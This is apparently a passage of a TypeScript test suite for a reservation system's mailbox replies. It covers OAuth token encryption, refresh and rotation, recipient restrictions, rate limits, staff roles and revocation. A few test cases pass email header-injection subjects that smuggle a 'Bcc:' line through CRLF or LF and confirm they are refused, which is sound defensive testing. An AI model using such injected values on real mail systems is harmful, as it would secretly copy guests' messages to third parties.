    expect(await openMenuMailSecret(KEY, refresh, menuMailAad({ purpose: "refresh", ...binding }))).toBe("g-refresh-1");
    expect(await storedSecret(env, "access", "gmail")).toBe("g-access-1");

    const wrong = [
      menuMailAad({ purpose: "refresh", ...binding, menuServiceId: env.w.b.menuServiceId }),
      menuMailAad({ purpose: "access", ...binding }),
      menuMailAad({ purpose: "refresh", ...binding, provider: "microsoft" }),
      menuMailAad({ purpose: "refresh", ...binding, binding: "druga@demo.example" }),
    ];
    for (const aad of wrong) await expect(openMenuMailSecret(KEY, refresh, aad)).rejects.toThrow();
    const otherKey = Uint8Array.from({ length: 32 }, (_, index) => 200 - index);
    await expect(openMenuMailSecret(otherKey, refresh, menuMailAad({ purpose: "refresh", ...binding }))).rejects.toThrow();
  });

  test("the stored verifier is the one the provider got, and the audit rows carry no token", async () => {
    const env = await world();
    await connect(env, "microsoft");
    const row = must((await stateRows(env))[0]);
    const verifier = await openMenuMailSecret(
      KEY,
      { ciphertext: row.codeVerifierCiphertext, iv: row.codeVerifierIv },
      menuMailAad({ purpose: "verifier", menuServiceId: env.w.a.menuServiceId, provider: "microsoft", binding: row.stateHash }),
    );
    expect(fake.state.verifiers).toEqual([verifier]);
    const audit = await auditRows(env, "mail.connected");
    expect(audit).toHaveLength(1);
    expect(audit[0]).toMatchObject({ actorUserId: env.w.ownerId, entityType: "menuMailConnections", details: { provider: "microsoft" } });
    expect(JSON.stringify(audit)).not.toMatch(/m-access|m-refresh|verifier/i);
  });

  test("completeConnect and sendReply answers carry no key or string that looks like a secret", async () => {
    const { env, reservationId } = await ready();
    const connected = await complete((await begin(env, "gmail")).state, env.owner);
    const sent = await send(env, reservationId);
    const duplicate = await send(env, reservationId, { clientSendId: "send-dup00001" });
    const context = await env.owner.query(api.menuMail.replyContext, { ...panel(env), reservationId });
    const secrets = ["g-access-1", "g-refresh-1", "g-refresh-2", ...fake.state.verifiers];
    for (const [name, answer] of Object.entries({ connected, sent, duplicate, context })) {
      expect(leaksIn(answer, secrets), name).toEqual([]);
    }
    expect(connected).toMatchObject({ ok: true });
    expect(sent).toEqual({ ok: true, status: "sent" });
  });

  test("exactly completeConnect and sendReply are public; revokeAtProvider is internal", () => {
    type Registered = { isPublic?: boolean; isInternal?: boolean };
    const registered = Object.fromEntries(
      Object.entries(menuMailActions)
        .filter(([, value]) => typeof value === "function" && ((value as Registered).isPublic || (value as Registered).isInternal))
        .map(([name, value]) => [name, (value as Registered).isPublic ? "public" : "internal"]),
    );
    expect(registered).toEqual({ completeConnect: "public", sendReply: "public", revokeAtProvider: "internal" });
  });
});

// -----------------------------------------------------------------------------
// 4. Sending
// -----------------------------------------------------------------------------

describe("sendReply: where it goes", () => {
  test("Gmail: only to the reservation's own contactEmail, from the connected address, with the exact text; no refresh was needed", async () => {
    const { env, reservationId } = await ready("gmail");
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });

    expect(gmailSends()).toHaveLength(1);
    expect(gmailSends()[0].headers.get("Authorization")).toBe("Bearer g-access-1");
    expect(googleTokenCalls()).toHaveLength(1); // the code exchange only: the cached token was used
    const mime = parseMime(fake.state.sentRaw[0]);
    expect(mime.headers.to).toBe(GUEST);
    expect(mime.headers.from).toBe(ADDRESS);
    expect(mime.headers["content-type"]).toContain("text/plain");
    expect(mime.subject).toBe(SUBJECT);
    expect(mime.body).toBe(BODY);
    expect(mime.mime).not.toMatch(/^bcc:/im);
  });

  test("Microsoft: only to the contactEmail through Graph, as plain text, saved to the sent items", async () => {
    const { env, reservationId } = await ready("microsoft");
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    expect(graphSends()).toHaveLength(1);
    expect(graphSends()[0].headers.get("Authorization")).toBe("Bearer m-access-1");
    expect(fake.state.sentGraph).toEqual([
      {
        message: {
          subject: SUBJECT,
          body: { contentType: "Text", content: BODY },
          toRecipients: [{ emailAddress: { address: GUEST } }],
        },
        saveToSentItems: true,
      },
    ]);
  });

  test("sendReply has no recipient argument: passing `to` is rejected by the validator and nothing is sent", async () => {
    const { env, reservationId } = await ready();
    const args = { ...panel(env), reservationId, kind: "accept", subject: SUBJECT, body: BODY, clientSendId: nextSendId(), to: "tudja@example.com" };
    await expect(env.owner.action(api.menuMailActions.sendReply, args as never)).rejects.toThrow();
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);
  });

  test("a reservation without an e-mail address (a phone-only form) is mail/no_recipient and nothing is sent", async () => {
    const { env, reservationId } = await ready("gmail", "phone");
    const row = must(await env.t.run(async (ctx) => await ctx.db.get(reservationId)));
    expect(row.contactEmail).toBeUndefined();
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.noRecipient });
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);
  });

  test("without a connected mailbox (never connected, or disconnected) it is mail/not_connected", async () => {
    const env = await world();
    await openForm(env);
    const { reservationId } = await guestRequest(env);
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.notConnected });
    await connect(env, "gmail");
    await env.owner.mutation(api.menuMail.disconnect, { menuServiceId: env.w.a.menuServiceId });
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.notConnected });
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);
  });
});

describe("sendReply: the record", () => {
  test("idempotent per clientSendId: two calls send once, the second answers sent", async () => {
    const { env, reservationId } = await ready();
    const clientSendId = "send-idem0001";
    expect(await send(env, reservationId, { clientSendId })).toEqual({ ok: true, status: "sent" });
    expect(await send(env, reservationId, { clientSendId })).toEqual({ ok: true, status: "sent" });
    expect(gmailSends()).toHaveLength(1);
    expect(await replyRows(env)).toHaveLength(1);
  });

  test("a clientSendId already used for another reservation, or a malformed one, is mail/invalid_input", async () => {
    const { env, reservationId } = await ready();
    const second = await guestRequest(env);
    await send(env, reservationId, { clientSendId: "send-other001" });
    expect(await send(env, second.reservationId, { clientSendId: "send-other001" })).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(await send(env, reservationId, { clientSendId: "short" })).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(await send(env, reservationId, { clientSendId: "has spaces in it!" })).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(gmailSends()).toHaveLength(1);
  });

  test("the reply row is sent/mailbox/kind with the provider's message id, and neither subject nor text is stored anywhere", async () => {
    const { env, reservationId } = await ready();
    const clientSendId = "send-record01";
    await send(env, reservationId, { clientSendId, kind: "propose" });
    const rows = await replyRows(env);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({
      reservationId,
      menuServiceId: env.w.a.menuServiceId,
      channel: "mailbox",
      kind: "propose",
      status: "sent",
      providerMessageId: "msg123",
      clientSendId,
      byUserId: env.w.ownerId,
      createdAt: T0,
    });
    expect(rows[0].errorCode).toBeUndefined();
    expect(Object.keys(rows[0]).sort()).toEqual(
      ["_creationTime", "_id", "byUserId", "channel", "clientSendId", "createdAt", "kind", "menuServiceId", "providerMessageId", "reservationId", "status", "updatedAt"],
    );
    const dump = JSON.stringify(await everything(env));
    for (const text of [SUBJECT, "Dobar dan", "čćžšđ", "ČĆŽŠĐ"]) expect(dump).not.toContain(text);
  });

  test("a PIN waiter sends; the reply is recorded under the waiter and shown with the name", async () => {
    const { env, reservationId } = await ready();
    const { staffId, token } = await signedIn(env, "Ana", "246");
    expect(await send(env, reservationId, { who: env.t, token })).toEqual({ ok: true, status: "sent" });
    expect(parseMime(fake.state.sentRaw[0]).headers.to).toBe(GUEST);
    const rows = await replyRows(env);
    expect(rows[0]).toMatchObject({ byStaffId: staffId, status: "sent" });
    expect(rows[0].byUserId).toBeUndefined();

    const context = must(await env.t.query(api.menuMail.replyContext, { ...panel(env, token), reservationId }));
    expect(context.mailbox).toEqual({ available: true, connection: { provider: "gmail", emailAddress: ADDRESS, status: "active" } });
    expect(context.replies).toEqual([
      { id: rows[0]._id, channel: "mailbox", kind: "accept", status: "sent", phoneOutcome: null, errorCode: null, createdAt: T0, byName: "Ana" },
    ]);
  });
});

describe("sendReply: tokens, refresh and rotation", () => {
  test("an expired access token (2 h later) is refreshed first and then used; the cached token is replaced", async () => {
    const { env, reservationId } = await ready("gmail");
    vi.setSystemTime(T0 + 2 * HOUR);
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    const refreshes = googleTokenCalls().filter((call) => fake.form(call).get("grant_type") === "refresh_token");
    expect(refreshes).toHaveLength(1);
    expect(fake.form(refreshes[0]).get("refresh_token")).toBe("g-refresh-1");
    expect(gmailSends()[0].headers.get("Authorization")).toBe("Bearer g-access-2");
    expect(await storedSecret(env, "access", "gmail")).toBe("g-access-2");
    expect(must((await connectionRows(env))[0]).accessTokenExpiresAt).toBe(T0 + 2 * HOUR + 3_599_000);
  });

  test("a changed MENU_MAIL_TOKEN_KEY is a server setting: provider_unavailable, the connection stays active, nothing sent", async () => {
    const { env, reservationId } = await ready("gmail");
    process.env.MENU_MAIL_TOKEN_KEY = bytesToBase64(Uint8Array.from({ length: 32 }, (_, index) => 200 - index));
    vi.setSystemTime(T0 + 2 * HOUR);
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.providerUnavailable });
    expect(gmailSends()).toEqual([]);
    expect(must((await connectionRows(env))[0]).status).toBe("active");
  });

  test("a token with more than a minute left is used as it is; with less than a minute left it is refreshed first", async () => {
    const { env, reservationId } = await ready("gmail");
    vi.setSystemTime(T0 + 3_599_000 - 2 * MINUTE);
    await send(env, reservationId);
    expect(googleTokenCalls()).toHaveLength(1);
    vi.setSystemTime(T0 + 3_599_000 - 30_000);
    await send(env, reservationId);
    expect(googleTokenCalls()).toHaveLength(2);
  });

  test("Google does not rotate: the refresh ciphertext is unchanged after a refresh", async () => {
    const { env, reservationId } = await ready("gmail");
    const before = must((await connectionRows(env))[0]);
    vi.setSystemTime(T0 + 2 * HOUR);
    await send(env, reservationId);
    const after = must((await connectionRows(env))[0]);
    expect(after.refreshTokenCiphertext).toBe(before.refreshTokenCiphertext);
    expect(after.refreshTokenIv).toBe(before.refreshTokenIv);
    expect(after.accessTokenCiphertext).not.toBe(before.accessTokenCiphertext);
  });

  test("Microsoft rotates: every refresh stores the new refresh token and the next one uses it", async () => {
    const { env, reservationId } = await ready("microsoft");
    const first = must((await connectionRows(env))[0]);
    expect(await storedSecret(env, "refresh", "microsoft")).toBe("m-refresh-1");

    vi.setSystemTime(T0 + 2 * HOUR);
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    const second = must((await connectionRows(env))[0]);
    expect(second.refreshTokenCiphertext).not.toBe(first.refreshTokenCiphertext);
    expect(await storedSecret(env, "refresh", "microsoft")).toBe("m-refresh-2");

    vi.setSystemTime(T0 + 4 * HOUR);
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    expect(await storedSecret(env, "refresh", "microsoft")).toBe("m-refresh-3");

    const refreshes = microsoftTokenCalls().filter((call) => fake.form(call).get("grant_type") === "refresh_token");
    expect(refreshes.map((call) => fake.form(call).get("refresh_token"))).toEqual(["m-refresh-1", "m-refresh-2"]);
    expect(graphSends().map((call) => call.headers.get("Authorization"))).toEqual(["Bearer m-access-2", "Bearer m-access-3"]);
  });

  test("a 401 on a token that looked valid causes exactly one refresh and a retry that succeeds", async () => {
    const { env, reservationId } = await ready("gmail");
    fake.state.validAccess.clear(); // the provider no longer honours the cached token
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    expect(gmailSends().map((call) => call.headers.get("Authorization"))).toEqual(["Bearer g-access-1", "Bearer g-access-2"]);
    expect(googleTokenCalls().filter((call) => fake.form(call).get("grant_type") === "refresh_token")).toHaveLength(1);
    const rows = await replyRows(env);
    expect(rows[0]).toMatchObject({ status: "sent", providerMessageId: "msg123" });
    expect(must((await connectionRows(env))[0]).status).toBe("active");
  });

  test("a 401 even after the refresh means the connection must be made again", async () => {
    const { env, reservationId } = await ready("gmail");
    fake.state.sendUnauthorized = true;
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.reconnectRequired });
    expect(gmailSends()).toHaveLength(2);
    expect(googleTokenCalls().filter((call) => fake.form(call).get("grant_type") === "refresh_token")).toHaveLength(1);
    expect(must((await connectionRows(env))[0]).status).toBe("error");
  });

  test("a refresh answered with invalid_grant: reconnect_required, the connection goes to error, the next send fails without network", async () => {
    const { env, reservationId } = await ready("gmail");
    vi.setSystemTime(T0 + 2 * HOUR);
    fake.state.refreshRejected = true;
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.reconnectRequired });
    expect(gmailSends()).toEqual([]);

    const row = must((await connectionRows(env))[0]);
    expect(row).toMatchObject({ status: "error", lastErrorCode: MAIL_ERROR.reconnectRequired });
    expect(row.accessTokenCiphertext).toBeUndefined();
    expect(row.accessTokenExpiresAt).toBeUndefined();
    const status = must(await env.owner.query(api.menuMail.status, { menuServiceId: env.w.a.menuServiceId }));
    expect(status.connection).toMatchObject({ status: "error", lastErrorCode: MAIL_ERROR.reconnectRequired });

    const context = must(await env.owner.query(api.menuMail.replyContext, { ...panel(env), reservationId }));
    expect(context.mailbox.connection).toEqual({ provider: "gmail", emailAddress: ADDRESS, status: "error" });
    expect(context.replies).toHaveLength(1);
    expect(context.replies[0]).toMatchObject({ channel: "mailbox", kind: "accept", status: "failed", errorCode: MAIL_ERROR.reconnectRequired });

    const callsBefore = fake.calls.length;
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.reconnectRequired });
    expect(fake.calls).toHaveLength(callsBefore);
    expect(await replyRows(env)).toHaveLength(1); // no new row for a refusal before the claim

    // The Owner connects again and sending works.
    fake.state.refreshRejected = false;
    await connect(env, "gmail");
    expect(must((await connectionRows(env))[0])).toMatchObject({ status: "active" });
    expect(must((await connectionRows(env))[0]).lastErrorCode).toBeUndefined();
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
  });

  test.each([
    [500, MAIL_ERROR.sendFailed],
    [429, MAIL_ERROR.rateLimited],
  ] as const)("the provider answering %s is %s: the reply is failed, the connection stays active, a new send works", async (status, code) => {
    const { env, reservationId } = await ready("gmail");
    fake.state.sendStatus = status;
    expect(await send(env, reservationId)).toEqual({ ok: false, code });
    const rows = await replyRows(env);
    expect(rows[0]).toMatchObject({ status: "failed", errorCode: code });
    expect(rows[0].providerMessageId).toBeUndefined();
    expect(must((await connectionRows(env))[0]).status).toBe("active");
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
  });
});

describe("sendReply: what the server refuses to send", () => {
  test.each([
    ["an empty subject", { subject: "" }],
    ["a subject of only line breaks", { subject: "\r\n\r\n" }],
    ["a subject of 151 characters", { subject: "s".repeat(151) }],
    ["an empty body", { body: "  \n " }],
    ["a body of 4001 characters", { body: "b".repeat(4001) }],
  ])("%s is mail/invalid_input: nothing is sent or recorded", async (_name, overrides: { subject?: string; body?: string }) => {
    const { env, reservationId } = await ready();
    expect(await send(env, reservationId, overrides)).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);
  });

  test.each([
    ["CRLF", "Potvrda\r\nBcc: x@example.com"],
    ["a bare LF", "Potvrda\nBcc: x@example.com"],
  ])("header injection through %s in the subject: refused for both providers, nothing sent, no row", async (_name, subject) => {
    const { env, reservationId } = await ready("gmail");
    expect(await send(env, reservationId, { subject })).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);

    const microsoft = await ready("microsoft");
    expect(await send(microsoft.env, microsoft.reservationId, { subject })).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(fake.state.sentGraph).toEqual([]);
  });

  test("MIME and Graph carry exactly one recipient and no Bcc header", async () => {
    const { env, reservationId } = await ready("gmail");
    await send(env, reservationId, { subject: "Potvrda  rezervacije" });
    const mime = parseMime(fake.state.sentRaw[0]);
    expect(mime.headers.bcc).toBeUndefined();
    expect(mime.headers.to).toBe(GUEST);
    expect(mime.subject).toBe("Potvrda rezervacije");

    const microsoft = await ready("microsoft");
    await send(microsoft.env, microsoft.reservationId);
    const sent = fake.state.sentGraph[0] as { message: { toRecipients: unknown[]; bccRecipients?: unknown } };
    expect(sent.message.toRecipients).toHaveLength(1);
    expect(sent.message.bccRecipients).toBeUndefined();
  });

  // Fixed in K26: the subject is validated as sent (a line break is refused), then cleaned.
  test("a subject with a line break is refused with mail/invalid_input and nothing is sent", async () => {
    const { env, reservationId } = await ready();
    expect(await send(env, reservationId, { subject: "Potvrda\r\nBcc: x@example.com" })).toEqual({ ok: false, code: MAIL_ERROR.invalidInput });
    expect(gmailSends()).toEqual([]);
  });

  test("the limits are inclusive: 150 characters of subject and 4000 of body go out", async () => {
    const { env, reservationId } = await ready();
    expect(await send(env, reservationId, { subject: "s".repeat(150), body: "b".repeat(4000) })).toEqual({ ok: true, status: "sent" });
    expect(parseMime(fake.state.sentRaw[0]).body).toHaveLength(4000);
  });
});

describe("sendReply: rate limits", () => {
  test("the 6th send of one person within a minute is mail/rate_limited and leaves no row; a minute later it works", async () => {
    const { env, reservationId } = await ready();
    const { reservationId: second } = await guestRequest(env);
    for (let index = 0; index < 3; index += 1) expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    for (let index = 0; index < 2; index += 1) expect(await send(env, second)).toEqual({ ok: true, status: "sent" });
    expect(await send(env, second)).toEqual({ ok: false, code: MAIL_ERROR.rateLimited });
    expect(gmailSends()).toHaveLength(5);
    expect(await replyRows(env)).toHaveLength(5);

    // The limit is per person: the Manager (by account) still sends.
    expect(await send(env, second, { who: as(env.t, env.w.managerId) })).toEqual({ ok: true, status: "sent" });

    vi.setSystemTime(T0 + MINUTE);
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
  });

  test("one reservation gets at most 5 messages a day, whoever sends; another reservation is not affected", async () => {
    const { env, reservationId } = await ready();
    const { reservationId: other } = await guestRequest(env);
    const manager = as(env.t, env.w.managerId);
    for (let index = 0; index < 3; index += 1) expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
    for (let index = 0; index < 2; index += 1) expect(await send(env, reservationId, { who: manager })).toEqual({ ok: true, status: "sent" });
    const { token } = await signedIn(env, "Ana", "246");
    expect(await send(env, reservationId, { who: env.t, token })).toEqual({ ok: false, code: MAIL_ERROR.rateLimited });
    expect(gmailSends()).toHaveLength(5);
    expect(await send(env, other, { who: env.t, token })).toEqual({ ok: true, status: "sent" });
  });

  test("the venue's hourly bucket (30) is checked too: once spent, even a fresh person is mail/rate_limited", async () => {
    const { env, reservationId } = await ready();
    await env.t.run(async (ctx) => {
      for (let index = 0; index < 30; index += 1) {
        await rateLimiter.limit(ctx, "menuMailSendService", { key: env.w.a.menuServiceId });
      }
    });
    expect(await send(env, reservationId)).toEqual({ ok: false, code: MAIL_ERROR.rateLimited });
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);
  });
});

// -----------------------------------------------------------------------------
// 5. Who may send, in which venue
// -----------------------------------------------------------------------------

describe("sendReply: roles and tenants", () => {
  test("the Owner, the Manager and PIN staff of the venue send; nobody else does", async () => {
    const { env, reservationId } = await ready();
    const { token } = await signedIn(env, "Ana", "246");
    expect(await send(env, reservationId, { who: as(env.t, env.w.managerId) })).toEqual({ ok: true, status: "sent" });
    expect(await send(env, reservationId, { who: env.t, token })).toEqual({ ok: true, status: "sent" });
    expect(gmailSends()).toHaveLength(2);

    const signedOut = { ok: false, code: STAFF_ERROR.signedOut };
    // An Urednik (editor), finance, view-only, outsiders and the other venue's owner are not waiters.
    for (const userId of [env.w.editorId, env.w.financeId, env.w.viewOnlyId, env.w.outsiderId, env.w.otherOwnerId]) {
      expect(await send(env, reservationId, { who: as(env.t, userId) })).toEqual(signedOut);
    }
    // Anonymous, a wrong code, an invented token (which never falls back to the account), a signed-out token.
    expect(await send(env, reservationId, { who: env.t })).toEqual(signedOut);
    expect(await env.t.action(api.menuMailActions.sendReply, { ...panel(env, token), panelCode: "ZZZZZZZZZZ", reservationId, kind: "accept", subject: SUBJECT, body: BODY, clientSendId: nextSendId() })).toEqual(signedOut);
    expect(await send(env, reservationId, { who: as(env.t, env.w.ownerId), token: BOGUS_TOKEN })).toEqual(signedOut);
    await env.t.mutation(api.menuWaiter.logout, { ...panel(env, token), sessionToken: token });
    expect(await send(env, reservationId, { who: env.t, token })).toEqual(signedOut);

    expect(gmailSends()).toHaveLength(2);
    expect(await replyRows(env)).toHaveLength(2);
  });

  test("venue b's staff with venue a's slug and code is signed out; venue a's staff with venue b's reservation id gets reservation/not_found", async () => {
    const { env, reservationId } = await ready();
    const { token: ana } = await signedIn(env, "Ana", "246");
    const { token: petar } = await signedIn(env, "Petar", "246", "b");
    const foreign = await putReservation(env, env.w.b);

    expect(await send(env, reservationId, { who: env.t, token: petar, venue: "a" })).toEqual({ ok: false, code: STAFF_ERROR.signedOut });
    expect(await send(env, foreign, { who: env.t, token: ana })).toEqual({ ok: false, code: RESERVATION_ERROR.notFound });
    expect(await send(env, foreign, { who: env.owner })).toEqual({ ok: false, code: RESERVATION_ERROR.notFound });
    expect(gmailSends()).toEqual([]);
    expect(await replyRows(env)).toEqual([]);
  });
});

// -----------------------------------------------------------------------------
// 6. disconnect, with the provider
// -----------------------------------------------------------------------------

describe("disconnect with a live connection", () => {
  test("Gmail: the tokens are gone at once, a scheduled revoke reaches Google with the refresh token, both audit rows exist without a token", async () => {
    const env = await world();
    await connect(env, "gmail");
    expect(await env.owner.mutation(api.menuMail.disconnect, { menuServiceId: env.w.a.menuServiceId })).toEqual({ ok: true });

    const row = must((await connectionRows(env))[0]);
    expect(row.status).toBe("revoked");
    for (const field of ["refreshTokenCiphertext", "refreshTokenIv", "accessTokenCiphertext", "accessTokenIv"] as const) expect(row[field], field).toBeUndefined();
    const status = must(await env.owner.query(api.menuMail.status, { menuServiceId: env.w.a.menuServiceId }));
    expect(status.connection).toBeNull();

    expect(fake.callsTo(HOST_GOOGLE_TOKEN, "/revoke")).toEqual([]); // not before the scheduled function runs
    await env.t.finishAllScheduledFunctions(vi.runAllTimers);
    const revokes = fake.callsTo(HOST_GOOGLE_TOKEN, "/revoke");
    expect(revokes).toHaveLength(1);
    expect(fake.form(revokes[0]).get("token")).toBe("g-refresh-1");

    const connected = await auditRows(env, "mail.connected");
    const disconnected = await auditRows(env, "mail.disconnected");
    expect(connected).toHaveLength(1);
    expect(disconnected).toHaveLength(1);
    expect(disconnected[0]).toMatchObject({ actorUserId: env.w.ownerId, details: { provider: "gmail" } });
    expect(JSON.stringify([connected, disconnected])).not.toMatch(/g-access|g-refresh/);
  });

  test("Microsoft has no revocation endpoint: disconnect revokes locally and calls nobody", async () => {
    const env = await world();
    await connect(env, "microsoft");
    const callsBefore = fake.calls.length;
    await env.owner.mutation(api.menuMail.disconnect, { menuServiceId: env.w.a.menuServiceId });
    await env.t.finishAllScheduledFunctions(vi.runAllTimers);
    expect(fake.calls).toHaveLength(callsBefore);
    expect(must((await connectionRows(env))[0]).status).toBe("revoked");
  });

  test("after a disconnect the venue can connect again and send", async () => {
    const { env, reservationId } = await ready("gmail");
    await env.owner.mutation(api.menuMail.disconnect, { menuServiceId: env.w.a.menuServiceId });
    await connect(env, "gmail");
    const rows = await connectionRows(env);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ status: "active" });
    expect(rows[0].revokedAt).toBeUndefined();
    expect(await send(env, reservationId)).toEqual({ ok: true, status: "sent" });
  });
});
